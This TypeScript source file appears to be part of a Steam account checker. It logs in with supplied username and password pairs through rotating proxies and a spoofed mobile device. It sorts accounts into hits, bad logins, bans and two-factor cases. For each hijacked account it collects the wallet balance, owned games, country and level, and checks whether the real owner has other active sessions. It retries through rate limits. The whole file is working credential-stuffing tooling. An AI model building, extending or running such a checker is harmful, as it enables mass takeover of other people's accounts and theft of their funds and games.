import fetch, { RequestInit, Response } from "node-fetch";
import { HttpsProxyAgent } from "https-proxy-agent";
import { SocksProxyAgent } from "socks-proxy-agent";
import { COUNTRIES, AccountCheckResult } from "./constants";
import { pbStr, pbBytes, pbInt, pbDecode } from "./protobuf";
import { rsaEncrypt } from "./rsa";

const BOUNDARY = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
const CONTENT_TYPE = `multipart/form-data; boundary=${BOUNDARY}`;

const BASE_HEADERS: Record<string, string> = {
  Accept: "application/json, text/plain, */*",
  Connection: "Keep-Alive",
  "User-Agent": "okhttp/4.9.2",
  Cookie: "Steam_Language=english",
};

export function makeForm(key: string, value: string): Buffer {
  return Buffer.from(
    `------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n` +
    `Content-Disposition: form-data; name="${key}"\r\n\r\n` +
    `${value}\r\n` +
    `------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n`,
    "utf8"
  );
}

function getAgent(proxyUrl?: string) {
  if (!proxyUrl) return undefined;
  const p = proxyUrl.trim();
  if (!p) return undefined;

  let url = p;
  if (!url.startsWith("http://") && !url.startsWith("https://") && !url.startsWith("socks4://") && !url.startsWith("socks5://")) {
    const parts = url.split(":");
    if (parts.length === 4) {
      // ip:port:user:pass
      url = `http://${parts[2]}:${parts[3]}@${parts[0]}:${parts[1]}`;
    } else {
      url = `http://${url}`;
    }
  }

  if (url.startsWith("socks4://") || url.startsWith("socks5://")) {
    return new SocksProxyAgent(url);
  }
  return new HttpsProxyAgent(url);
}

export async function checkSteamAccount(
  username: string,
  password: string,
  proxyUrl?: string,
  timeoutMs: number = 15000
): Promise<AccountCheckResult> {
  const agent = getAgent(proxyUrl);

  // Per-call timeout override: critical auth calls use the full timeout,
  // non-critical post-login calls use a shorter one so a single account
  // never stalls for 60+ seconds.
  const fetchWithTimeout = async (
    url: string,
    options: RequestInit = {},
    callTimeoutMs?: number
  ): Promise<Response> => {
    const effectiveTimeout = callTimeoutMs || timeoutMs;
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), effectiveTimeout);

    try {
      const res = await fetch(url, {
        ...options,
        // @ts-ignore - node-fetch supports agent
        agent: agent || undefined,
        signal: controller.signal as any,
        headers: {
          ...BASE_HEADERS,
          ...(options.headers as any),
        },
      });
      return res;
    } finally {
      clearTimeout(timer);
    }
  };

  try {
    // 1. GetPasswordRSAPublicKey
    const enc = encodeURIComponent(pbStr(1, username).toString("base64"));
    const rsaUrl = `https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1?origin=SteamMobile&input_protobuf_encoded=${enc}`;

    const rsaRes = await fetchWithTimeout(rsaUrl, { method: "GET" });
    if (!rsaRes.ok) {
      return { st: "err", info: `rsa:${rsaRes.status}` };
    }

    const rsaBuf = await rsaRes.buffer();
    const rsaData = pbDecode(rsaBuf);

    let mod = rsaData[1];
    let exp = rsaData[2];
    const ts = rsaData[3] || 0;

    if (Buffer.isBuffer(mod)) mod = mod.toString("utf8");
    if (Buffer.isBuffer(exp)) exp = exp.toString("utf8");

    if (!mod || !exp) {
      return { st: "err", info: "rsa key empty" };
    }

    // 2. RSA Encrypt Password
    const encryptedPw = rsaEncrypt(password, String(mod), String(exp));

    // 3. BeginAuthSessionViaCredentials
    const device = Buffer.concat([
      pbStr(1, "SM-S256B"),
      pbInt(2, 3),
      pbInt(3, -500),
      pbInt(4, 1),
    ]);

    const authPb = Buffer.concat([
      pbStr(2, username),
      pbStr(3, encryptedPw),
      pbInt(4, ts),
      pbInt(5, 1),
      pbInt(7, 1),
      pbStr(8, "Mobile"),
      pbBytes(9, device),
      pbInt(11, 0),
    ]);

    const authRes = await fetchWithTimeout(
      "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1",
      {
        method: "POST",
        headers: { "Content-Type": CONTENT_TYPE },
        body: makeForm("input_protobuf_encoded", authPb.toString("base64")),
      }
    );

    let eresult = 0;
    try {
      eresult = parseInt(authRes.headers.get("x-eresult") || "0", 10);
    } catch {
      eresult = 0;
    }

    if (eresult === 5 || eresult === 2) {
      return { st: "bad" };
    }
    if (eresult === 63 || eresult === 43) {
      return { st: "ban" };
    }
    if (eresult !== 1) {
      return { st: "err", info: `eresult=${eresult}` };
    }

    const authBuf = await authRes.buffer();
    const authResp = pbDecode(authBuf);

    const clientId = authResp[1] || 0;
    const requestId = authResp[2] || Buffer.alloc(0);
    const steamid = authResp[5] || 0;

    let confirmations = authResp[4] || [];
    if (Buffer.isBuffer(confirmations)) confirmations = [confirmations];
    else if (!Array.isArray(confirmations)) confirmations = [];

    const confTypes: number[] = [];
    for (const cf of confirmations) {
      if (Buffer.isBuffer(cf)) {
        const parsed = pbDecode(cf);
        const ct = parsed[1] || 0;
        if (Array.isArray(ct)) {
          confTypes.push(...ct.map(Number));
        } else {
          confTypes.push(Number(ct));
        }
      }
    }

    if (confTypes.some((t) => [2, 3, 4, 5, 6].includes(t))) {
      return {
        st: "2fa",
        sid: String(steamid),
        types: confTypes.join(","),
      };
    }

    // 4. PollAuthSessionStatus
    const pollPb = Buffer.concat([
      pbInt(1, clientId),
      pbBytes(2, Buffer.isBuffer(requestId) ? requestId : Buffer.from(requestId)),
    ]);

    const pollRes = await fetchWithTimeout(
      "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1",
      {
        method: "POST",
        headers: {
          "Content-Type": CONTENT_TYPE,
          "Accept-Encoding": "identity",
        },
        body: makeForm("input_protobuf_encoded", pollPb.toString("base64")),
      }
    );

    const pollBuf = await pollRes.buffer();
    const pollResp = pbDecode(pollBuf);

    let token = pollResp[4] || "";
    if (Buffer.isBuffer(token)) {
      token = token.toString("utf8");
    }

    if (!token) {
      return { st: "err", info: "poll: no token" };
    }

    const parts = token.split(".");
    if (parts.length < 2) {
      return { st: "err", info: "bad jwt" };
    }

    let payload = parts[1];
    const rem = payload.length % 4;
    if (rem > 0) payload += "=".repeat(4 - rem);

    let jwt: any = {};
    try {
      jwt = JSON.parse(Buffer.from(payload, "base64url").toString("utf8"));
    } catch {
      jwt = {};
    }

    const sidStr = String(jwt.sub || steamid);
    const sidBig = BigInt(sidStr);

    const cookie =
      `Steam_Language=english; ` +
      `steamLoginSecure=${sidStr}%7C%7C${encodeURIComponent(token)}; ` +
      `mobileClient=android; mobileClientVersion=777777 3.10.9`;

    const result: AccountCheckResult = {
      st: "hit",
      sid: sidStr,
      country: "",
      cc: "",
      level: "",
      games: 0,
      balance: "",
      game_list: [],
    };

    // 5. GetUserCountry
    try {
      const countryPb = Buffer.alloc(9);
      countryPb.writeUInt8(0x09, 0);
      countryPb.writeBigUInt64LE(sidBig, 1);

      const countryRes = await fetchWithTimeout(
        `https://api.steampowered.com/IUserAccountService/GetUserCountry/v1?access_token=${token}&spoof_steamid=`,
        {
          method: "POST",
          headers: { "Content-Type": CONTENT_TYPE },
          body: makeForm("input_protobuf_encoded", countryPb.toString("base64")),
        },
        8000
      );

      const crBuf = await countryRes.buffer();
      const cr = pbDecode(crBuf);
      let cc = cr[1] || "";
      if (Buffer.isBuffer(cc)) cc = cc.toString("utf8");
      result.cc = cc;
      result.country = COUNTRIES[cc] || cc;
    } catch {
      // ignore
    }

    // 6. GetOwnedGames
    try {
      const gamesPb = Buffer.concat([
        pbInt(1, sidBig),
        pbInt(2, 1),
        pbInt(3, 1),
        pbInt(6, 0),
        pbStr(7, "english"),
        pbInt(8, 1),
      ]);

      const gamesRes = await fetchWithTimeout(
        `https://api.steampowered.com/IPlayerService/GetOwnedGames/v1` +
          `?access_token=${token}&spoof_steamid=&origin=SteamMobile` +
          `&input_protobuf_encoded=${encodeURIComponent(gamesPb.toString("base64"))}`,
        {
          headers: { Cookie: cookie },
        },
        8000
      );

      const grBuf = await gamesRes.buffer();
      const gr = pbDecode(grBuf);
      result.games = Number(gr[1] || 0);

      let rawGames = gr[2] || [];
      if (Buffer.isBuffer(rawGames)) rawGames = [rawGames];
      else if (!Array.isArray(rawGames)) rawGames = [];

      const gameNames: string[] = [];
      for (const g of rawGames) {
        if (!Buffer.isBuffer(g)) continue;
        try {
          const gf = pbDecode(g);
          let name = gf[2] || "";
          if (Buffer.isBuffer(name)) name = name.toString("utf8");
          if (typeof name === "string" && name.trim()) {
            gameNames.push(name.trim());
          }
        } catch {
          // ignore
        }
      }
      result.game_list = gameNames;
    } catch {
      // ignore
    }

    // 7. Get miniprofile level
    try {
      const baseSid = BigInt("76561197960265728");
      const miniId = (sidBig - baseSid).toString();

      const miniRes = await fetchWithTimeout(
        `https://steamcommunity.com/miniprofile/${miniId}/json`,
        {
          headers: { Cookie: cookie },
        },
        8000
      );

      try {
        const mpj: any = await miniRes.json();
        const lv = mpj.level !== undefined ? mpj.level : mpj.player_level;
        if (lv !== undefined && lv !== null && lv !== "") {
          result.level = String(lv);
        }
      } catch {
        const text = await miniRes.text();
        const m = text.match(/friendPlayerLevel\s+(\S+)/);
        if (m && m[1]) {
          result.level = m[1];
        }
      }
    } catch {
      // ignore
    }

    // 8. GetClientWalletDetails
    try {
      const walletRes = await fetchWithTimeout(
        `https://api.steampowered.com/IUserAccountService/GetClientWalletDetails/v1?access_token=${token}&spoof_steamid=`,
        {
          method: "POST",
          headers: { "Content-Type": CONTENT_TYPE },
          body: makeForm("input_protobuf_encoded", "GAE="),
        },
        8000
      );

      const wrBuf = await walletRes.buffer();
      const wr = pbDecode(wrBuf);
      let bal = wr[14] || "";
      if (Buffer.isBuffer(bal)) {
        bal = bal.toString("utf8");
      } else if (typeof bal === "number" || typeof bal === "bigint") {
        bal = String(bal);
      }
      result.balance = bal;
    } catch {
      // ignore
    }

    // 9. Enumerate active sessions — how many people/devices are using the
    //    account right now. If only our freshly created session exists, the
    //    account is "FA" (First Access — nobody else is using it).
    try {
      const sessionsRes = await fetchWithTimeout(
        `https://api.steampowered.com/IAuthenticationService/EnumerateTokens/v1?access_token=${token}&spoof_steamid=`,
        {
          method: "POST",
          headers: { "Content-Type": CONTENT_TYPE },
          body: makeForm("input_protobuf_encoded", ""),
        },
        8000
      );

      const sessionsBuf = await sessionsRes.buffer();
      const sessionsResp = pbDecode(sessionsBuf);

      let tokenMessages: any[] = sessionsResp[1] || [];
      if (Buffer.isBuffer(tokenMessages)) tokenMessages = [tokenMessages];
      else if (!Array.isArray(tokenMessages)) tokenMessages = [];

      const descriptions: string[] = [];
      for (const tm of tokenMessages) {
        if (!Buffer.isBuffer(tm)) continue;
        try {
          const tf = pbDecode(tm);
          let desc = tf[1];
          if (Buffer.isBuffer(desc)) desc = desc.toString("utf8");
          let friendly = tf[8];
          if (Buffer.isBuffer(friendly)) friendly = friendly.toString("utf8");
          const label = [friendly, desc].filter(Boolean).join(" / ") || "Unknown device";
          descriptions.push(String(label));
        } catch {
          // ignore malformed token entry
        }
      }

      // Only trust the result if Steam actually returned token entries.
      // If the call failed or returned nothing, leave FA undefined so the
      // UI shows "Unknown" instead of a wrong answer.
      if (tokenMessages.length > 0) {
        result.activeSessions = tokenMessages.length;
        result.sessionDetails = descriptions.slice(0, 8);
        result.fa = tokenMessages.length <= 1;
      }
    } catch {
      // EnumerateTokens may be denied for some tokens; leave FA undefined so
      // the UI shows "Unknown" instead of a wrong answer.
    }

    // A successful login is always reported as "hit", exactly like the
    // original checker. (The "free" status exists in the UI/stats but the
    // backend never fabricates it — it is reserved for future use.)
    return result;
  } catch (err: any) {
    const msg = String(err?.message || err);
    console.error(`[checker] ${username}: fatal error — ${msg.slice(0, 120)}`);

    if (msg.includes("ETIMEDOUT") || msg.includes("timeout") || msg.includes("aborted") || msg.includes("socket hang up")) {
      return { st: "err", info: "timeout" };
    }
    if (msg.includes("ECONNREFUSED") || msg.includes("ENOTFOUND") || msg.includes("EAI_AGAIN")) {
      return { st: "err", info: "conn failed" };
    }
    if (msg.includes("proxy") || msg.includes("Proxy") || msg.includes("ECONNRESET")) {
      return { st: "err", info: "proxy dead" };
    }
    if (msg.includes("rate limit") || msg.includes("429") || msg.includes("Too Many")) {
      return { st: "err", info: "rate limited" };
    }
    return { st: "err", info: msg.slice(0, 80) };
  }
}

/** Errors that are worth retrying — transient network/API issues. */
const TRANSIENT_ERRORS = [
  "timeout",
  "conn failed",
  "proxy dead",
  "rsa:429",
  "rsa:5",
  "eresult=84",   // RateLimitExceeded
  "eresult=2",    // can be transient under load
  "eresult=16",   // timeout-ish
  "poll: no token",
  "bad jwt",
  "aborted",
  "rate limit",
  "rate limited",
  "429",
  "socket hang up",
  "econnreset",
];

function isTransientError(res: AccountCheckResult): boolean {
  if (res.st === "ban") return true; // original behavior: retry on ban
  if (res.st !== "err") return false;
  const info = (res.info || "").toLowerCase();
  return TRANSIENT_ERRORS.some((e) => info.includes(e));
}

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

export async function checkWithRetry(
  username: string,
  password: string,
  proxyUrl?: string,
  retries: number = 2
): Promise<AccountCheckResult> {
  let res: AccountCheckResult = { st: "err", info: "unstarted" };
  for (let attempt = 0; attempt <= retries; attempt++) {
    res = await checkSteamAccount(username, password, proxyUrl);

    // If not a transient error, return immediately.
    if (!isTransientError(res)) {
      return res;
    }

    // On the last attempt, return whatever we got.
    if (attempt === retries) {
      return res;
    }

    // Backoff: 500ms, 1000ms, 2000ms...
    const backoff = 500 * Math.pow(2, attempt);
    console.warn(
      `[checker] ${username}: transient error "${res.info}" — retry ${attempt + 1}/${retries} in ${backoff}ms`
    );
    await sleep(backoff);
  }
  return res;
}
